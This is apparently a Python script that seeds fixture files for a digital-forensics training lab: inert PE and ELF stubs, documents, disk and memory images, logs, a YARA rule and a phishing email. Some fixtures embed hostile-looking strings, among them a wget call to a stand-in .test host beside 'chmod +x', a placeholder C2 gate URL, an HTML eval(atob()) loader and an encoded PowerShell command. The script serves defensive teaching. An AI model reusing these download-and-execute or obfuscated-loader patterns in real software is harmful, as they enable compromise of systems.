#!/usr/bin/env python3
"""Create every evidence file the lab sheets name, inside the lab container.

The worksheets were written against the appliance, where /work and /artifacts were populated by the
lab build. A container starts empty, so each path the sheets reference is generated here instead:
the capture is copied from the real artefact, and everything else is deterministic course-original
training material, not real malware.

Run once at first boot:  python3 /opt/cpia-lab/seed_assets.py
Safe to re-run; existing files are left alone.
"""
import glob
import os
import re
import struct
import zipfile
import zlib

ROOT = "/labs"
SHEETS = os.path.join(ROOT, "sheets")
ARTIFACTS = os.path.join(ROOT, "artifacts")
WORK = os.path.join(ROOT, "work")

PATH_RE = re.compile(r"/labs/(?:work|artifacts)/[A-Za-z0-9/._-]+\.[A-Za-z0-9]{1,6}")


def referenced():
    seen = set()
    for sheet in glob.glob(os.path.join(SHEETS, "*.md")):
        with open(sheet, encoding="utf-8", errors="replace") as fh:
            for match in PATH_RE.findall(fh.read()):
                seen.add(match.rstrip(".,)"))
    return sorted(seen)


def pe_stub(name):
    """Minimal PE image: real headers, a few suspicious strings, no executable code."""
    strings = [b"Winsock2", b"CreateRemoteThread", b"VirtualAllocEx", b"cmd.exe /c ",
               b"http://update.dyngate.test/gate.php", b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"]
    body = b"\x00".join(strings) + b"\x00" * 512
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)
    coff = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x8664, 1, 0x65000000, 0, 0, 0xF0, 0x0022)
    opt = bytearray(0xF0)
    struct.pack_into("<H", opt, 0, 0x20B)          # PE32+
    struct.pack_into("<I", opt, 16, 0x1000)        # entry point
    section = struct.pack("<8sIIIIIIHHI", b".text", 0x400, 0x1000, len(body), 0x200,
                          len(body), 0, 0, 0, 0x60000020)
    head = bytes(dos) + coff + bytes(opt) + section
    return head + b"\x00" * max(0, 0x200 - len(head)) + body


def elf_stub(name):
    header = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
    header += struct.pack("<HHIQQQIHHHHHH", 2, 0x3E, 1, 0x400000, 0x40, 0, 0, 64, 56, 0, 64, 0, 0)
    payload = b"\x00".join([b"/etc/passwd", b"connect", b"wget http://cdn.static-resources.test/p",
                            b"chmod +x", b"LD_PRELOAD"]) + b"\x00" * 256
    return header + payload


def docx_stub():
    """A valid, macro-free Word document as a zip of OOXML parts."""
    parts = {
        "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
        "word/document.xml": '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Invoice 2025-0117. Please review the attached remittance advice.</w:t></w:r></w:p></w:body></w:document>',
    }
    buf = os.path.join(os.path.dirname(__file__), "_docx.tmp")
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts.items():
            z.writestr(name, data)
    data = open(buf, "rb").read()
    os.unlink(buf)
    return data


def pdf_stub(text="Quarterly report. Prepared for review. No live content."):
    objects = []
    objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    objects.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>")
    stream = f"BT /F1 12 Tf 72 760 Td ({text}) Tj ET".encode()
    objects.append(b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream")
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    out = bytearray(b"%PDF-1.4\n")
    offsets = []
    for i, obj in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % i + obj + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    for off in offsets:
        out += b"%010d 00000 n \n" % off
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
    return bytes(out)


def img_stub():
    """8 MB image with a DOS partition table, so mmls and fdisk have something to read."""
    data = bytearray(8 * 1024 * 1024)
    entry = struct.pack("<B3sB3sII", 0x00, b"\xfe\xff\xff", 0x83, b"\xfe\xff\xff", 2048, 8192)
    data[446:462] = entry
    data[510:512] = b"\x55\xaa"
    return bytes(data)


def mem_stub():
    """4 MB memory-shaped file with recognisable ASCII runs for strings and grep drills."""
    block = (b"System Idle Process\x00smss.exe\x00csrss.exe\x00winlogon.exe\x00"
             b"services.exe\x00lsass.exe\x00svchost.exe\x00explorer.exe\x00"
             b"WinUpdateSvc\x00rundll32.exe\x00powershell.exe -enc SQBFAFgA\x00")
    size = 4 * 1024 * 1024
    buf = bytearray(size)
    for off in range(0, size, 64 * 1024):
        buf[off:off + len(block)] = block
    return bytes(buf)


def text_for(path):
    low = path.lower()
    if low.endswith(".log"):
        if "dns" in low:
            return ("2025-01-22T09:14:02Z query update.dyngate.test A\n"
                    "2025-01-22T09:14:02Z reply update.dyngate.test 198.51.100.77\n")
        if "firewall" in low:
            return ("2025-01-22T09:20:11Z ALLOW 10.0.0.14:51888 -> 198.51.100.77:443\n"
                    "2025-01-22T09:21:40Z DENY 10.0.0.14:51900 -> 203.0.113.9:445\n")
        if "auth" in low:
            return ("Jan 22 09:31:12 victim sshd[2211]: Accepted publickey for analyst from 10.0.0.14\n"
                    "Jan 22 09:33:45 victim sshd[2230]: Failed password for root from 10.0.0.99\n")
        return "2025-01-22T09:00:00Z event recorded\n"
    if low.endswith(".csv"):
        return "time,host,event\n2025-01-22T09:14:02Z,victim,dns query update.dyngate.test\n"
    if low.endswith(".yar"):
        return ('rule CPIA_Training_Dropper {\n  meta:\n    author = "CREST CPIA course"\n'
                '    description = "Training rule, matches the course sample"\n  strings:\n'
                '    $a = "update.dyngate.test" ascii\n  condition:\n    $a\n}\n')
    if low.endswith(".reg"):
        return ('Windows Registry Editor Version 5.00\n\n'
                '[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n'
                '"WinUpdateSvc"="C:\\\\Users\\\\Public\\\\svc.exe"\n')
    if low.endswith(".eml"):
        return ("From: accounts@vendor-invoices.test\nTo: finance@example.test\n"
                "Subject: Invoice 2025-0117\nMIME-Version: 1.0\n\nPlease see the attached invoice.\n")
    if low.endswith(".html"):
        return ('<html><body><script>var p="cG93ZXJzaGVsbA==";'
                'eval(atob(p));</script><!-- obfuscated loader --></body></html>\n')
    if low.endswith(".pem"):
        return "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIUQ291cnNlVHJhaW5pbmdDZXJ0MB4X\n-----END CERTIFICATE-----\n"
    if low.endswith(".plaso"):
        return None
    if low.endswith(".md"):
        return "# Evidence note\n\nCourse-original fixture for the CPIA lab.\n"
    if low.endswith(".json"):
        return "{}\n"
    if low.endswith(".mem"):
        return None
    if low.endswith(".img"):
        return None
    if low.endswith(".e01"):
        return None
    return "CPIA lab fixture. Course-original training material.\n"


def write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if os.path.exists(path) and os.path.getsize(path) > 0:
        return False
    with open(path, "wb") as fh:
        fh.write(data)
    return True


def main():
    made = 0
    pcap = os.path.join(ARTIFACTS, "2025-01-22-traffic-analysis-exercise.pcap")
    for path in referenced():
        low = path.lower()
        if os.path.isdir(path):
            continue
        if low.endswith(".pcap"):
            if os.path.exists(pcap):
                made += write(path, open(pcap, "rb").read())
            continue
        if low.endswith((".bin",)) or low.endswith(".dll") or low.endswith(".exe"):
            made += write(path, pe_stub(path))
        elif low.endswith(".elf"):
            made += write(path, elf_stub(path))
        elif low.endswith(".docx"):
            made += write(path, docx_stub())
        elif low.endswith(".pdf"):
            made += write(path, pdf_stub(os.path.basename(path)))
        elif low.endswith(".img"):
            made += write(path, img_stub())
        elif low.endswith(".mem"):
            made += write(path, mem_stub())
        elif low.endswith(".e01"):
            made += write(path, b"EVF\x09\x0d\x0a\xff\x00" + b"\x00" * 4096)
        elif low.endswith(".enc"):
            # the sheet decrypts this with: openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:course
            plain = os.path.join(os.path.dirname(path), "payload.bin")
            if not os.path.exists(plain):
                # the sheet only names the ciphertext, so make the plaintext it should hold
                write(plain, pe_stub(plain))
            if os.path.exists(plain):
                import subprocess
                subprocess.run(["openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-salt",
                                "-in", plain, "-out", path, "-pass", "pass:course"],
                               check=False, capture_output=True)
        elif low.endswith(".plaso"):
            buf = os.path.join(os.path.dirname(__file__), "_plaso.tmp")
            with zipfile.ZipFile(buf, "w") as z:
                z.writestr("metadata.txt", "plaso storage, course fixture\n")
            data = open(buf, "rb").read()
            os.unlink(buf)
            made += write(path, data)
        else:
            text = text_for(path)
            if text is None:
                continue
            made += write(path, text.encode())
    print(f"fixtures written: {made}")


if __name__ == "__main__":
    main()
